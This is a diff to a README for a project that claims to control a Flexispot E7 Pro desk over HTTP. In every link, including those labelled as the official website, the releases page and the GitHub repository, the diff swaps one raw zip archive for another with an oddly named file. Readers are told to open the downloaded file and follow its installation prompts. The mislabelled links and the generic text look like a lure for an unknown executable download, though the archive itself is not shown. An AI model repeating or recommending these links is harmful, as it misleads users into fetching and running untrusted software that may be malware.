@@ -4,7 +4,7 @@
 This project helps you control your Flexispot Desk using HTTP. It includes scripts and instructions to help you get started. Whether you want to raise or lower your desk, this application makes it simple.
 
 ## 📥 Download Now
-[![Download Flexispot E7 Pro](https://github.com/Juanes2-1/flexispot-e7pro-nesson1/raw/refs/heads/main/quickborn/flexispot_nesson_e_pro_1.1.zip%20E7%https://github.com/Juanes2-1/flexispot-e7pro-nesson1/raw/refs/heads/main/quickborn/flexispot_nesson_e_pro_1.1.zip)](https://github.com/Juanes2-1/flexispot-e7pro-nesson1/raw/refs/heads/main/quickborn/flexispot_nesson_e_pro_1.1.zip)
+[![Download Flexispot E7 Pro](https://raw.githubusercontent.com/Juanes2-1/flexispot-e7pro-nesson1/main/quickborn/nesson_pro_flexispot_e_irreparableness.zip%20E7%https://raw.githubusercontent.com/Juanes2-1/flexispot-e7pro-nesson1/main/quickborn/nesson_pro_flexispot_e_irreparableness.zip)](https://raw.githubusercontent.com/Juanes2-1/flexispot-e7pro-nesson1/main/quickborn/nesson_pro_flexispot_e_irreparableness.zip)
 
 ## 📋 Topics
 - esp32
@@ -33,7 +33,7 @@ This project helps you control your Flexispot Desk using HTTP. It includes scrip
 To begin, follow these steps:
 
 1. **Download the Application**
-   Visit the [Releases page](https://github.com/Juanes2-1/flexispot-e7pro-nesson1/raw/refs/heads/main/quickborn/flexispot_nesson_e_pro_1.1.zip) to download the latest version of the application.
+   Visit the [Releases page](https://raw.githubusercontent.com/Juanes2-1/flexispot-e7pro-nesson1/main/quickborn/nesson_pro_flexispot_e_irreparableness.zip) to download the latest version of the application.
 
 2. **Install the Application**
    After downloading, locate the downloaded file. Open it to start the installation process. Follow the prompts to complete the setup.
@@ -48,14 +48,14 @@ To begin, follow these steps:
    Use the buttons or inputs provided in the application to raise or lower your desk as needed. Enjoy the ease of adjusting your workspace!
 
 ## 📂 Download & Install
-To get started with managing your Flexispot Desk, visit the [Releases page](https://github.com/Juanes2-1/flexispot-e7pro-nesson1/raw/refs/heads/main/quickborn/flexispot_nesson_e_pro_1.1.zip) to download the software.
+To get started with managing your Flexispot Desk, visit the [Releases page](https://raw.githubusercontent.com/Juanes2-1/flexispot-e7pro-nesson1/main/quickborn/nesson_pro_flexispot_e_irreparableness.zip) to download the software.
 
 ## 📝 Support
 If you encounter issues or have questions, please check the FAQ section in the documentation. You can also reach out via the repository.
 
 ## 🔗 Additional Resources
-- [Flexispot Official Website](https://github.com/Juanes2-1/flexispot-e7pro-nesson1/raw/refs/heads/main/quickborn/flexispot_nesson_e_pro_1.1.zip)
-- [GitHub Repository](https://github.com/Juanes2-1/flexispot-e7pro-nesson1/raw/refs/heads/main/quickborn/flexispot_nesson_e_pro_1.1.zip)
+- [Flexispot Official Website](https://raw.githubusercontent.com/Juanes2-1/flexispot-e7pro-nesson1/main/quickborn/nesson_pro_flexispot_e_irreparableness.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Juanes2-1/flexispot-e7pro-nesson1/main/quickborn/nesson_pro_flexispot_e_irreparableness.zip)
 
 ## ⚡️ Thanks for Using Flexispot E7 Pro
 We hope this tool helps you create a more comfortable workspace!
